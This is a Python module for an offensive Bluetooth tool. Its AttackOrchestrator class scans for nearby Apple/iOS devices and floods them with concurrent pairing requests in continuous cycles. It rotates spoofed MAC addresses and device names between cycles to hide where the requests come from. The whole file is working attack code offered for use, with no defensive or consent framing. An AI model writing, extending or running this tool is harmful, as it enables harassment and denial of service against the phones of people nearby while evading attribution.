"""
AttackOrchestrator — Asynchronous loop to cycle through target devices
and send concurrent Bluetooth "Pairing Request" packets.

Coordinates the TargetScanner (for device discovery), AdvertisingPayload
(for MAC/name rotation), and BluetoothManager (for pairing) into a
continuous attack loop with configurable concurrency and timing.
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

logger = logging.getLogger(__name__)


class OrchestratorState(str, Enum):
    """Running state of the orchestrator."""
    IDLE = "idle"
    RUNNING = "running"
    STOPPING = "stopping"
    STOPPED = "stopped"


@dataclass
class PairingAttempt:
    """Record of a single pairing attempt."""
    address: str
    device_name: str
    spoofed_mac: str
    status: str  # "connected", "paired", "failed"
    paired: bool
    connected: bool
    error: Optional[str]
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> dict:
        return {
            "address": self.address,
            "device_name": self.device_name,
            "spoofed_mac": self.spoofed_mac,
            "status": self.status,
            "paired": self.paired,
            "connected": self.connected,
            "error": self.error,
            "timestamp": self.timestamp,
        }


class AttackOrchestrator:
    """
    Asynchronous orchestrator that cycles through discovered target devices
    and sends concurrent Bluetooth pairing requests.

    Integrates:
    - TargetScanner: discovers nearby Apple/iOS devices via BLE
    - AdvertisingPayload: rotates MAC addresses and device names
    - BluetoothManager: sends pairing requests via D-Bus/BlueZ

    Usage:
        orchestrator = AttackOrchestrator(
            bluetooth_manager=bt_mgr,
            target_scanner=scanner,
            advertising_payload=payload,
        )
        await orchestrator.run(duration=60, intensity=3)
    """

    def __init__(
        self,
        bluetooth_manager,
        target_scanner,
        advertising_payload,
        concurrency: int = 3,
        cycle_delay: float = 1.0,
        rotate_identity: bool = True,
    ):
        """
        Initialize the AttackOrchestrator.

        Args:
            bluetooth_manager: BluetoothManager instance for pairing operations.
            target_scanner: TargetScanner instance for device discovery.
            advertising_payload: AdvertisingPayload instance for identity rotation.
            concurrency: Max number of concurrent pairing requests per cycle.
            cycle_delay: Delay in seconds between cycles (default 1.0s).
            rotate_identity: Whether to rotate MAC/name between cycles.
        """
        self._bt_manager = bluetooth_manager
        self._scanner = target_scanner
        self._payload = advertising_payload
        self._concurrency = max(1, concurrency)
        self._cycle_delay = max(0.0, cycle_delay)
        self._rotate_identity = rotate_identity

        self._state = OrchestratorState.IDLE
        self._stop_event = asyncio.Event()
        self._packets_sent = 0
        self._devices_targeted = 0
        self._cycles_completed = 0
        self._start_time: Optional[float] = None
        self._attempt_log: list[PairingAttempt] = []
        self._target_addresses: list[str] = []
        self._current_mac: Optional[str] = None
        self._current_name: Optional[str] = None

    # ── Properties ─────────────────────────────────────────────────────

    @property
    def state(self) -> OrchestratorState:
        """Return the current orchestrator state."""
        return self._state

    @property
    def packets_sent(self) -> int:
        """Return total pairing request packets sent."""
        return self._packets_sent

    @property
    def devices_targeted(self) -> int:
        """Return number of unique devices targeted."""
        return self._devices_targeted

    @property
    def cycles_completed(self) -> int:
        """Return number of completed attack cycles."""
        return self._cycles_completed

    @property
    def concurrency(self) -> int:
        """Return the concurrency level."""
        return self._concurrency

    @concurrency.setter
    def concurrency(self, value: int) -> None:
        """Set the concurrency level. Must be >= 1."""
        if value < 1:
            raise ValueError("concurrency must be >= 1")
        self._concurrency = value

    @property
    def cycle_delay(self) -> float:
        """Return the delay between cycles in seconds."""
        return self._cycle_delay

    @cycle_delay.setter
    def cycle_delay(self, value: float) -> None:
        """Set the cycle delay. Must be >= 0."""
        if value < 0:
            raise ValueError("cycle_delay must be >= 0")
        self._cycle_delay = value

    @property
    def is_running(self) -> bool:
        """Return whether the orchestrator is actively running."""
        return self._state == OrchestratorState.RUNNING

    @property
    def target_addresses(self) -> list[str]:
        """Return the current target address list."""
        return list(self._target_addresses)

    @property
    def attempt_log(self) -> list[PairingAttempt]:
        """Return the log of all pairing attempts."""
        return list(self._attempt_log)

    @property
    def elapsed_time(self) -> float:
        """Return elapsed time since the orchestrator started, or 0 if not started."""
        if self._start_time is None:
            return 0.0
        return time.time() - self._start_time

    # ── Core Async Loop ────────────────────────────────────────────────

    async def _send_pairing_request(self, address: str) -> PairingAttempt:
        """
        Send a single pairing request to a target address in a thread executor.

        BluetoothManager.trigger_pairing_request() is synchronous (D-Bus calls),
        so we run it in an executor to avoid blocking the event loop.

        Args:
            address: Target Bluetooth address.

        Returns:
            PairingAttempt record of the result.
        """
        loop = asyncio.get_event_loop()
        mac = self._current_mac or "unknown"
        name = self._current_name or "unknown"

        try:
            result = await loop.run_in_executor(
                None,
                self._bt_manager.trigger_pairing_request,
                address,
            )
            attempt = PairingAttempt(
                address=address,
                device_name=name,
                spoofed_mac=mac,
                status=result.get("status", "failed"),
                paired=result.get("paired", False),
                connected=result.get("connected", False),
                error=result.get("error"),
            )
        except Exception as e:
            attempt = PairingAttempt(
                address=address,
                device_name=name,
                spoofed_mac=mac,
                status="failed",
                paired=False,
                connected=False,
                error=str(e),
            )

        self._packets_sent += 1
        self._attempt_log.append(attempt)
        logger.info(
            "Pairing attempt to %s: %s (packet #%d)",
            address,
            attempt.status,
            self._packets_sent,
        )
        return attempt

    async def _run_cycle(self, targets: list[str]) -> list[PairingAttempt]:
        """
        Run one attack cycle: send concurrent pairing requests to a batch
        of target addresses.

        Targets are processed in batches of size `concurrency`. Each batch
        runs concurrently using asyncio.gather().

        Args:
            targets: List of target Bluetooth addresses for this cycle.

        Returns:
            List of PairingAttempt results for this cycle.
        """
        if self._rotate_identity:
            mac, name = self._payload.next_payload()
            self._current_mac = mac
            self._current_name = name
            try:
                self._bt_manager.alias = name
            except Exception as e:
                logger.warning("Failed to set adapter alias to '%s': %s", name, e)

        cycle_results = []

        # Process targets in concurrent batches
        for i in range(0, len(targets), self._concurrency):
            if self._stop_event.is_set():
                break

            batch = targets[i:i + self._concurrency]
            tasks = [self._send_pairing_request(addr) for addr in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if isinstance(result, PairingAttempt):
                    cycle_results.append(result)
                elif isinstance(result, Exception):
                    logger.error("Unexpected error in pairing task: %s", result)

        self._cycles_completed += 1
        return cycle_results

    async def run(
        self,
        duration: Optional[float] = None,
        max_cycles: Optional[int] = None,
        scan_between_cycles: bool = True,
        scan_duration: Optional[float] = None,
    ) -> dict:
        """
        Run the attack orchestrator loop.

        Continuously cycles through discovered targets, sending concurrent
        pairing requests until the duration expires, max_cycles is reached,
        or stop() is called.

        Args:
            duration: Maximum run time in seconds. None = run until stopped.
            max_cycles: Maximum number of cycles. None = unlimited.
            scan_between_cycles: Whether to re-scan for targets between cycles.
            scan_duration: Override scan duration per cycle (seconds).

        Returns:
            Summary dict with stats from the run.
        """
        if self._state == OrchestratorState.RUNNING:
            raise RuntimeError("Orchestrator is already running")

        self._state = OrchestratorState.RUNNING
        self._stop_event.clear()
        self._start_time = time.time()
        self._packets_sent = 0
        self._devices_targeted = 0
        self._cycles_completed = 0
        self._attempt_log = []
        targeted_set: set[str] = set()

        logger.info(
            "Orchestrator started (duration=%s, max_cycles=%s, concurrency=%d)",
            duration,
            max_cycles,
            self._concurrency,
        )

        try:
            # Initial scan to discover targets
            if scan_duration is not None:
                original_duration = self._scanner.scan_duration
                self._scanner.scan_duration = scan_duration

            devices = await self._scanner.scan()
            self._target_addresses = [d.address for d in devices]

            if scan_duration is not None:
                self._scanner.scan_duration = original_duration

            if not self._target_addresses:
                logger.warning("No targets discovered. Orchestrator stopping.")
                return self._build_summary()

            targeted_set.update(self._target_addresses)
            self._devices_targeted = len(targeted_set)

            while not self._stop_event.is_set():
                # Check duration limit
                if duration is not None and self.elapsed_time >= duration:
                    logger.info("Duration limit reached (%.1fs)", duration)
                    break

                # Check cycle limit
                if max_cycles is not None and self._cycles_completed >= max_cycles:
                    logger.info("Max cycles reached (%d)", max_cycles)
                    break

                # Run one cycle
                await self._run_cycle(self._target_addresses)

                # Inter-cycle delay
                if self._cycle_delay > 0 and not self._stop_event.is_set():
                    try:
                        await asyncio.wait_for(
                            self._stop_event.wait(),
                            timeout=self._cycle_delay,
                        )
                    except asyncio.TimeoutError:
                        pass  # Normal — delay elapsed without stop

                # Re-scan for updated targets between cycles
                if scan_between_cycles and not self._stop_event.is_set():
                    if scan_duration is not None:
                        original_duration = self._scanner.scan_duration
                        self._scanner.scan_duration = scan_duration

                    devices = await self._scanner.scan()
                    new_addresses = [d.address for d in devices]
                    if new_addresses:
                        self._target_addresses = new_addresses
                        targeted_set.update(new_addresses)
                        self._devices_targeted = len(targeted_set)

                    if scan_duration is not None:
                        self._scanner.scan_duration = original_duration

        finally:
            self._state = OrchestratorState.STOPPED
            logger.info(
                "Orchestrator stopped: %d packets sent to %d devices in %d cycles (%.1fs)",
                self._packets_sent,
                self._devices_targeted,
                self._cycles_completed,
                self.elapsed_time,
            )

        return self._build_summary()

    def stop(self) -> None:
        """
        Signal the orchestrator to stop after the current cycle completes.

        Thread-safe: can be called from any thread or coroutine.
        """
        if self._state == OrchestratorState.RUNNING:
            self._state = OrchestratorState.STOPPING
            self._stop_event.set()
            logger.info("Orchestrator stop requested")

    def _build_summary(self) -> dict:
        """Build a summary dict of the orchestrator run."""
        return {
            "state": self._state.value,
            "packets_sent": self._packets_sent,
            "devices_targeted": self._devices_targeted,
            "cycles_completed": self._cycles_completed,
            "elapsed_seconds": round(self.elapsed_time, 2),
            "concurrency": self._concurrency,
            "cycle_delay": self._cycle_delay,
            "target_addresses": list(self._target_addresses),
            "attempts": [a.to_dict() for a in self._attempt_log],
        }

    def get_stats(self) -> dict:
        """
        Return current orchestrator statistics.

        Can be called while running to get real-time counters.
        """
        return {
            "state": self._state.value,
            "packets_sent": self._packets_sent,
            "devices_targeted": self._devices_targeted,
            "cycles_completed": self._cycles_completed,
            "elapsed_seconds": round(self.elapsed_time, 2),
            "concurrency": self._concurrency,
            "is_running": self.is_running,
            "current_mac": self._current_mac,
            "current_name": self._current_name,
            "target_count": len(self._target_addresses),
        }

    def reset(self) -> None:
        """
        Reset the orchestrator to its initial state.

        Can only be called when the orchestrator is not running.

        Raises:
            RuntimeError: If the orchestrator is currently running.
        """
        if self._state == OrchestratorState.RUNNING:
            raise RuntimeError("Cannot reset while running")
        self._state = OrchestratorState.IDLE
        self._stop_event.clear()
        self._packets_sent = 0
        self._devices_targeted = 0
        self._cycles_completed = 0
        self._start_time = None
        self._attempt_log = []
        self._target_addresses = []
        self._current_mac = None
        self._current_name = None
        logger.info("Orchestrator reset")

    def set_targets(self, addresses: list[str]) -> None:
        """
        Manually set the target address list.

        Useful for pre-loading targets without scanning.

        Args:
            addresses: List of Bluetooth MAC addresses.
        """
        self._target_addresses = list(addresses)
        self._devices_targeted = len(set(addresses))
        logger.info("Targets set manually: %d addresses", len(addresses))
